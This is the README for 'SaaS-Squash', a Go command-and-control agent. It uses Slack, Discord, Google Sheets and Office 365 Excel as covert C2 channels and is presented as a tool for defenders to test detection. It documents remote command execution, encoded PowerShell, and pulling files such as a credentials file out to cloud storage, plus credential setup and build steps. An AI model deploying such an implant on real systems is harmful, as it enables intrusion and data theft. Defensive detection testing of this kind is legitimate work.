# SaaS-Squash Overview

This is a collection of SaaS apps that can be used as C2 servers that have been used by threat actors in the past. This is not an exhaustive list, but will continue to add integrations as they are found. The main goal is on this app is to lower skill level required for defenders to be able to test their security controls against known C2 infrastructure.

This is designed to be as straight forward as possible and does not use any EDR or firewall bypass techniques when building/compiling the executable. This is to ensure that the payloads are as easy to detect as possible while trying to mimic the real world as techniques.

## Disclaimer

This is for educational purposes only. I am not responsible for any damage caused by the use of this tool. Please use responsibly.

## Current Integrations

1. [Slack](<https://slack.com/>)
2. [Google Sheets](<https://www.google.com/sheets>)
3. [Office 365 Excel](<https://www.office.com/>)
4. [Discord](<https://discord.com/>)

## To Do

- [X] Release the first version
- [X] Change Google Drive to use filename instead of file ID
- [ ] Get the Google Sheets HTTP3/QUIC working
- [ ] Get Slack Web API working (currently working with RTM)
- [ ] Add Pastebin, Gists, and other file sharing apps
- [ ] Add Telegram, Twitter, and other social media apps
- [ ] Add more Office 365 apps
- [ ] Add more Google apps
- [ ] More to come...

## Configuration

The app can be used to create a single SaaS app, fall through multiple apps until a connection is made, or try to create sessions to each one that's configured simultaneously.  Each of these can be controlled by either:

- Hardcoding the values inside the common/credentials.go file flag to the app
- Filling in the values in the config.json file and having it in the same directory as the app when it's launched

## How to use

Each time the app is launched it will create a 8 character hex UUID to let the endpoint know if the commands are meant for it to execute or not.  If the SaaS app has other ways to differentiate the clients (e.g. they each have a seperate speadsheet page) then the UUID isn't needed.  When it disocers a command it will check to see if it's base64 incoded, if so it will run it as a Powershell encoded command.  If it's not base64 encoded it will run it as a normal command.  The following commands are supported:

1. Discord, Slack example:  in the following example the client UUID is `60d45c81` and we want to tell the client to download the last attachment from the channel.  Following the UUID (space is opotional) you can enter the BOT UUID + COMMAND:  
   - Download example: `60d45c81 download`
   - Upload example of README.md: `60d45c81 download README.md`
   - Execute whois example: `60d45c81 whois`
   - Execute PowerShell encoded command example to get the public IP ((Invoke-WebRequest -URI https://icanhazip.com/).Content): `60d45c81 KABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAUgBJACAAaAB0AHQAcABzADoALwAvAGkAYwBhAG4AaABhAHoAaQBwAC4AYwBvAG0ALwApAC4AQwBvAG4AdABlAG4AdAA=`
1. O365 Excel, Google Sheets exapmle: both of these apps create spreadsheets to track endpoints connections so the UUID isn't needed.  Instead the command to get executed goes in Column A and the return value is in Column B.  These each use the designated file storage location to upload and download files (e.g. Google Drive, OneDrive, etc.)


| Example | Column A | Column B |
| -------- | -------- | -------- |
|Upload example   |upload;/etc/http3/credentials | File Uploaded to: https://drive.google.com/drive/u/0/folders/1C5C23sa8OeDqNNRc-OdjL4WcjVB4pFAPe|
|Google download (uses file ID) | download;1I80EO2PYK_-ahp7q_hsVQyjKmy23J67L;reverse.ps1|File Downloaded|
|O365 download (uses file name) | download;script.txt|File Downloaded|
| Cmd example         | whoami   | tim|
| Powershell encoded command Example | KABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAUgBJACAAaAB0AHQAcABzADoALwAvAGkAYwBhAG4AaABhAHoAaQBwAC4AYwBvAG0ALwApAC4AQwBvAG4AdABlAG4AdAA= | 52.123.5.2 |

### Defaults

The following table shows the default values for the app when it's launched without any flags or config.json file.  All other values not listed will be empty strings.
|Setting|Default Value|Description|
|-------|-------------|------------|
|Debug|true|Debug mode is on by default|
|MultiApp|true|All enabled apps will be used by default|
|DiscordBotEnable|false|Discord bot is disabled by default|
|SlackBotEnable|false|Slack bot is disabled by default|
|SlackRTM|true|Slack RTM mode is enabled by default|
|GoogleC2Enable|false|Google Sheets C2 is disabled by default|
|GoogleC2EnableHTTP3|false|Google Sheets C2 HTTP3/QUIC is disabled by default|
|O365ExcelEnable|false|Office 365 Excel C2 is disabled by default|

### Hardcoding Credentials

Prior to building the app, you can edit the common/credentials.go file to include the credentials for the SaaS apps you want to use.  The file is setup to allow you to add as many as you want, but you will need to add the code to the main.go file to use them.  The code to add is:

```go
// Universal Config
var (
    debug    bool = true  //debug is on by default
    multiApp bool = true  // all enable apps will be used by default
)

// Discord Info
var (
    discordBotEnable   bool   = false  // change to true to enable
    discordBotToken    string = ""  //add your token here (See Wiki for more info)
    discordBotUpload   string = "upload" // change if you want to use something else for upload
    discordBotDownload string = "download" // change if you want to use something else for download
)

// Slack Info
var (
    slackBotEnable       bool   = false // change to true to enable
    slackRTM             bool   = true // by default the RTM API is used
    slackBotRTMAuthToken string = ""  // add your RTM token here (See Wiki for more info)
    slackBotAuthToken    string = "" // add your Auth token here, not needed with RTM mode (See Wiki for more info)
    slackBotAppToken     string = "" // add your App token here, not needed with RTM mode (See Wiki for more info)
    slackBotUpload       string = "upload"  // change if you want to use something else for upload
    slackBotDownload     string = "download" // change if you want to use something else for download
)

// Google Sheets Info
var (
    googleC2Enable      bool   = false  // change to true to enable
    googleC2Credential  string = ""  // add your credential file here (See Wiki for more info)
    googleC2SheetId     string = "" // add your sheet ID here (See Wiki for more info)
    googleC2DriveId     string = "" // add your drive ID here (See Wiki for more info)
    googleC2ShowToken   bool   = false // change to true show token in sheet
    googleC2EnableHTTP3 bool   = false // change to true to enable HTTP3/QUIC (currently not implemented yet)
)

// Excel variables
var (
    o365ExcelEnable       bool   = false  // change to true to enable
    o365ExcelTenantId     string = ""  // add your tenant ID here (See Wiki for more info)
    o365ExcelClientId     string = "" // add your client ID here (See Wiki for more info)
    o365ExcelClientSecret string = "" // add your client secret here (See Wiki for more info)
    o365ExcelFileName     string = "" // add your file name here (See Wiki for more info)
    o365ExcelUserId       string = "" // add your user ID here (See Wiki for more info)
)
```

### Using the config.json file

Use the sample_config.json as a template to fill in the values for the SaaS apps you want to use.  The settings in the config.json file will override any cardcoded values to make it easy to customize the tests.

```json
{
    "discord": {
        "enable": false,
        "token": "your_discord_token",
        "upload": "file_upload_phrase",
        "download": "file_download_phrase"
    },
    "slack": {
        "enable": false,
        "rtm_auth_token": "your_slack_rtm_auth_token",
        "auth_token": "your_slack_auth_token",
        "app_token": "your_slack_app_token-not_needed_if_doing_RTM",
        "upload": "file_upload_phrase",
        "download": "file_download_phrase",
        "legacy_rtm_mode": true
    },
    "google": {
        "enable": false,
        "credential": "your_google_credentials_json_file-escaped_characters",
        "sheet_id": "your_google_sheet_id",
        "drive_id": "your_google_drive_id",
        "show_token": false,
        "enable_quic": false
    },
    "o365": {
        "enable": false,
        "tenant_id": "your_o365_tenant_id",
        "client_id": "your_o365_client_id",
        "client_secret": "your_o365_client_secret",
        "file_name": "name_of_your_xls_file_for_c2_commands",
        "user_id": "your_o365_user_id"
    },
    "debug": {
        "enable": true
    },
    "multi_app": {
        "enable": true
    }
}
```

## Building the app

Inside the build folder two scripts and a sample_config.json file have been included to help create builds for Windows, Linux, and MacOS 64-bit OS.  Each build script takes two arguments, the first is the executable name, and the second is to tell the script to compress the executable or not.  Each dose the same thing so choose the one that you like best...or ignore them and build the app yourself :see_no_evil:

- build.sh - `Bash` script for Linux and MacOS
- build.ps1 - `PowerShell` script for Windows

A sample command to build the app with the default name of "saas-squash" would be:

```none
./build.sh
```

or

```none
.\build.ps1
```

To build a smaller version of the app with a custom name of "saas-squash_small" you would run:

```none
./build.sh saas-squash_small small
```

or

```none
.\build.ps1 saas-squash_small small
```

Sample build size with normal and small builds:

![image.png](https://github.com/TechRinger/media/blob/main/images/saas-squash_size.png?raw=true)

## Donation

If you like what I've done and would like to donate, click the link below

[PayPal Donation](<https://www.paypal.com/donate/?hosted_button_id=VN9G973VD8HRA>)
